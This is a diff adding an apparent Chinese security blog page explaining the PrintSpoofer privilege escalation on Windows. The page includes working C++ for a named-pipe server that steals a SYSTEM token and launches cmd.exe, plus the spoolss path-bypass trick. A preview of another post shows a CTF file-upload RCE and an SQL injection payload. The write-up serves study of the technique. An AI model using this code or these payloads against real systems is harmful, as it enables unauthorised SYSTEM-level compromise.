@@ -1,0 +1,231 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PrintSpoofer提权漏洞 | Wu_dalang</title><meta name="author" content="Wudalang"><meta name="copyright" content="Wudalang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命名管道(Named pipes)命名管道由命名管道的服务端创建，使用windows API  创建管道实例，实现进程与进程之间的通信   1.命名管道用于进程与进程之间双向的通信，通过安全检查的进程都可以访问命名管道 2.命名管道所有的实例共享一个管道名称（如\\.\pipe\MyPipe，通过CreateNamedPipe函数设置），实例之间根据句柄和缓存区区分 3.命名管道有服务端和客户端，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PrintSpoofer提权漏洞">
+<meta property="og:url" content="https://daxigua21.github.io/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Wu_dalang">
+<meta property="og:description" content="命名管道(Named pipes)命名管道由命名管道的服务端创建，使用windows API  创建管道实例，实现进程与进程之间的通信   1.命名管道用于进程与进程之间双向的通信，通过安全检查的进程都可以访问命名管道 2.命名管道所有的实例共享一个管道名称（如\\.\pipe\MyPipe，通过CreateNamedPipe函数设置），实例之间根据句柄和缓存区区分 3.命名管道有服务端和客户端，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://daxigua21.github.io/img/a.jpg">
+<meta property="article:published_time" content="2026-04-14T13:05:30.000Z">
+<meta property="article:modified_time" content="2026-04-14T13:08:49.767Z">
+<meta property="article:author" content="Wudalang">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://daxigua21.github.io/img/a.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PrintSpoofer提权漏洞",
+  "url": "https://daxigua21.github.io/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/",
+  "image": "https://daxigua21.github.io/img/a.jpg",
+  "datePublished": "2026-04-14T13:05:30.000Z",
+  "dateModified": "2026-04-14T13:08:49.767Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Wudalang",
+      "url": "https://daxigua21.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/star.png"><link rel="canonical" href="https://daxigua21.github.io/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PrintSpoofer提权漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/config/css/transparancy.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(/img/b.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Wu_dalang</span></a><a class="nav-page-title" href="/"><span class="site-name">PrintSpoofer提权漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PrintSpoofer提权漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-14T13:05:30.000Z" title="发表于 2026-04-14 21:05:30">2026-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-14T13:08:49.767Z" title="更新于 2026-04-14 21:08:49">2026-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="命名管道-Named-pipes"><a href="#命名管道-Named-pipes" class="headerlink" title="命名管道(Named pipes)"></a>命名管道(Named pipes)</h1><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/ipc/named-pipes">命名管道</a>由命名管道的服务端创建，使用windows API  创建管道实例，实现进程与进程之间的通信</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413150224707.png" class="">
+
+<p>1.命名管道用于进程与进程之间双向的通信，通过安全检查的进程都可以访问命名管道</p>
+<p>2.命名管道所有的实例共享一个管道名称（如<code>\\.\pipe\MyPipe</code>，通过<code>CreateNamedPipe</code>函数设置），实例之间根据句柄和缓存区区分</p>
+<p>3.命名管道有服务端和客户端，一个服务端可以对多个客户端，且不同的客户端使用不同的管道实例</p>
+<p>可以通过<code>file://.//pipe//</code>查看Windows 系统上所有激活的命名管道列表</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413155242527.png" class="">
+
+<p>或者是在powershell中执行</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem \\.\pipe\</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413155354268.png" class="">
+
+<h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/a-gly">访问令牌</a>是描述<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/p-gly">进程</a>或线程<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/s-gly">的安全上下文</a>的对象。 令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。 用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。 如果 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/a-gly">对密码进行身份验证</a>，系统将生成访问令牌。 代表此用户执行的每个进程都有此访问令牌的副本。</p>
+<h3 id="令牌结构"><a href="#令牌结构" class="headerlink" title="令牌结构"></a>令牌结构</h3><ul>
+<li>用户帐户的安全标识符 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/security-identifiers">（SID）</a></li>
+<li>用户所属组的 SID</li>
+<li>标识当前<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/l-gly">登录会话</a>的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/l-gly">登录 SID</a></li>
+<li>用户或用户组持有的 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/privileges">特权列表</a></li>
+<li>所有者 SID</li>
+<li>主组的 SID</li>
+<li>系统创建安全对象时使用的默认 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">DACL</a>，而不指定 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/s-gly"><em>安全描述符</em></a></li>
+<li>访问令牌的源</li>
+<li>令牌是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/SecGloss/p-gly">主要</a> 还是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation">模拟</a> 令牌</li>
+<li>限制 SID <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens">的可选</a> 列表</li>
+<li>当前模拟级别</li>
+<li>其他统计信息</li>
+</ul>
+<h3 id="主令牌-Primary"><a href="#主令牌-Primary" class="headerlink" title="主令牌(Primary)"></a>主令牌(Primary)</h3><p>主令牌是进程的默认令牌，在进程创建时分配</p>
+<h3 id="模拟令牌"><a href="#模拟令牌" class="headerlink" title="模拟令牌"></a>模拟令牌</h3><p>当进程需要模仿客户端执行操作时，会生成模拟令牌，能否生成模拟令牌还得看客户端主令牌的令牌模拟级别。模拟令牌一般与线程相关，主令牌一般与进程相关</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260414131323629.png" class="">
+
+<p>下图三个windows的API在获得模拟令牌后用来模拟客户端创造进程</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260414132958424.png" class="">
+
+<p><code>SeImpersonatePrivilege</code> 是 Windows操作系统中的一种用户权限，允许用户在身份验证后模拟其他用户的身份</p>
+<p>默认情况下，<code>SeImpersonatePrivilege</code> 权限被分配给以下用户和组：</p>
+<ul>
+<li>本地管理员组的成员</li>
+<li>本地服务帐户</li>
+<li>由服务控制管理器（COM）启动的服务</li>
+</ul>
+<p>可以使用<code>whoami /priv | findstr 'SeImpersonatePrivilege'</code> 看有没有对应的权限，<code>lls</code>和<code>sqlserver</code>一般拥有该权限</p>
+<h2 id="ImpersonateNamedPipeClient"><a href="#ImpersonateNamedPipeClient" class="headerlink" title="ImpersonateNamedPipeClient()"></a>ImpersonateNamedPipeClient()</h2><p>提权漏洞的关键在于<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient">ImpersonateNamedPipeClient()</a>函数，该函数能让命名管道服务端模拟<strong>当前已连接且刚刚发送过消息</strong>的客户端。如果是SYSTEM权限的客户端连接服务端，调用<code>ImpersonateNamedPipeClient</code>，此时，服务端所在线程的安全上下文就会<strong>模拟（Impersonate）</strong> 成SYSTEM客户端的安全上下文，其线程的Access Token会被替换为SYSTEM级别的Token(模拟令牌)</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413161059675.png" class="">
+
+<p>根据令牌的知识，就能知道该函数成功模拟客户端的前提条件了</p>
+<h2 id="命名管道服务端具体实现"><a href="#命名管道服务端具体实现" class="headerlink" title="命名管道服务端具体实现"></a>命名管道服务端具体实现</h2><p>来自于<a target="_blank" rel="noopener" href="https://p001water.github.io/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html">P001water</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sddl.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void ImpersonatedUser(HANDLE hToken)</span><br><span class="line">{</span><br><span class="line">    DWORD dwCreationFlags = 0;</span><br><span class="line">    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;</span><br><span class="line">    BOOL g_bInteractWithConsole = TRUE;</span><br><span class="line">    LPWSTR pwszCurrentDirectory = NULL;</span><br><span class="line">    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;</span><br><span class="line">    LPVOID lpEnvironment = NULL;</span><br><span class="line">    PROCESS_INFORMATION pi = { 0 };</span><br><span class="line">    STARTUPINFO si = { 0 };</span><br><span class="line">    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;hSystemTokenDup);</span><br><span class="line">    CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"cmd.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &amp;si, &amp;pi);</span><br><span class="line">    return;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int wmain(int argc, wchar_t* argv[])</span><br><span class="line">{</span><br><span class="line">    LPWSTR pwszPipeName = argv[1];</span><br><span class="line">    TOKEN_GROUPS* group_token = NULL;</span><br><span class="line">    HANDLE hPipe = INVALID_HANDLE_VALUE;</span><br><span class="line">    HANDLE hToken = INVALID_HANDLE_VALUE;</span><br><span class="line">    SECURITY_DESCRIPTOR sd = { 0 };</span><br><span class="line">    SECURITY_ATTRIBUTES sa = { 0 };</span><br><span class="line">    DWORD buffer_size = 0;</span><br><span class="line"></span><br><span class="line">    InitializeSecurityDescriptor(&amp;sd, SECURITY_DESCRIPTOR_REVISION);</span><br><span class="line">    ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &amp;((&amp;sa)-&gt;lpSecurityDescriptor), NULL);</span><br><span class="line"></span><br><span class="line">    hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &amp;sa);</span><br><span class="line">    wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);</span><br><span class="line">    ConnectNamedPipe(hPipe, NULL);  </span><br><span class="line">    wprintf(L"[+] A client connected!\n");</span><br><span class="line"></span><br><span class="line">    ImpersonateNamedPipeClient(hPipe);</span><br><span class="line">    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);</span><br><span class="line">    ImpersonatedUser(hToken);</span><br><span class="line">    CloseHandle(hPipe);</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>提权核心</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImpersonateNamedPipeClient(hPipe);</span><br><span class="line">OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);</span><br><span class="line">ImpersonatedUser(hToken);  // 用偷来的token创建cmd.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>到这里就清楚怎么提权了，需要一个system权限且满足令牌模拟等级的命名管道客户端来主动连接有<code>SeImpersonatePrivilege</code>权限的命名管道服务端</p>
+<h1 id="打印机Printer"><a href="#打印机Printer" class="headerlink" title="打印机Printer"></a>打印机Printer</h1><p>打印机对应的服务是<code>print Spooler</code>，对应的进程是<code>Spoolsv.exe</code>，而且默认是启动的，并且在后台持续运行，且具有system权限，这就是我们想要的命名管道客户端，后面就得解决主动连接的问题</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413172645762.png" class="">
+
+<p><code>MS-RPRN</code>协议用于打印客户端和打印服务器之间的通信,底层依赖于RPC协议，简单来说RPC协议可以让RPC客户端调用RPC服务端的函数，在RPC服务端执行完后返回结果给RPC客户端。</p>
+<img src="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20260413212435499.png" class="">
+
+<p><code>Spoolsv.exe</code>作为打印机服务端，也是RPC的服务端，它的RPC的接口通过命名管道来公开，也就是说<code>Spoolsv.exe</code>同时还是命名管道的服务端，我们可以通过命名管道来调用<code>Spoolsv.exe</code>的方法函数。关键是Windows API中的<code>RpcRemoteFindFirstPrinterChangeNotificationEx()</code>函数，它可以创建一个远程更改通知对象，该对象监视对打印机对象的更改，并使用 <code>RpcRouterReplyPrinter</code> 或 <code>RpcRouterReplyPrinterEx</code> 将更改通知发送到打印客户端，并且就是通过命名管道实现进程之间的通信，如下图，如果我们把打印客户端的地址设置为恶意的命名管道服务端，就能让具有system权限的<code>Spoolsv.exe</code>通过命名管道访问恶意服务达到提权的目的</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(</span><br><span class="line">  [in] PRINTER_HANDLE hPrinter,</span><br><span class="line">  [in] DWORD fdwFlags,</span><br><span class="line">  [in] DWORD fdwOptions,</span><br><span class="line">  [in, string, unique] wchar_t* pszLocalMachine,</span><br><span class="line">  [in] DWORD dwPrinterLocal,</span><br><span class="line">  [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>pszLocalMachine</code> 参数就是用来<strong>指定通知回调服务器的地址</strong>的</p>
+<p><code>Spoolsv.exe</code>还有一个<code>servername</code>的检测需要绕过，因为根据 MS-RPRN 协议规范，打印服务的 RPC 接口注册在 <code>\pipe\spoolss</code> 这个固定的命名管道端点上。因此服务端只会尝试连接名为 <code>spoolss</code> 的管道，而且这个命名管道是已经被创建的，所以无法再次创建或者说覆盖。</p>
+<p>可以在 <code>pszLocalMachine</code> 参数中使用 <code>/</code> 来绕过路径验证，将管道路径拼接为攻击者控制的路径，从而成功连接并窃取令牌</p>
+<p>例如传入<code>\\server_name/aa</code>时，命名管道的路径就会拼接为<code>\\server_name\aa\pipe\spoolss</code>从而通过验证。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://p001water.github.io/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html">https://p001water.github.io/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://daxigua21.github.io">Wudalang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://daxigua21.github.io/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">https://daxigua21.github.io/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://daxigua21.github.io" target="_blank">Wu_dalang</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/windows/">windows</a></div><div class="post-share"><div class="social-share" data-image="/img/a.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/03/31/polarisctf/" title="polarisctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">polarisctf</div></div><div class="info-2"><div class="info-item-1">记录一下polarisctf，web单排名127，是的我是菜鸡-_-，路边一条。。。。   解出only_real_revenge题目简介  乘其他师傅吃午饭去了，抢了个血:) WPF12   登入后f12直接更改前端代码   然后上传文件，但是似乎没有成功，然后把路由换成upload.php   猜测上传目录是uploads，然后访问，发现确实存在这么个目录   尝试访问uploads/gifmm.jpg,成功上传 且文件名都没有改变   然后再上传.htaccess文件，让jpg文件当做php解析   然后rce读取flag     Broken Trust题目简介  wp注册，然后登入，点击refesh session data   发现返回了uid相关的数据，起初以为是根据session解析的，后面把uid随便改了发现报错了。所以应该有数据库的查询，尝试sql注入   1{"uid":"ede088b0999f4797a0255a384856b282' or 1=1--+"}  成功拿到adm...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">Wudalang</div><div class="author-info-description">wu_dalang的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><div id="welcome-info"></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93-Named-pipes"><span class="toc-number">1.</span> <span class="toc-text">命名管道(Named pipes)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-number">1.1.</span> <span class="toc-text">访问令牌</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.</span> <span class="toc-text">令牌结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 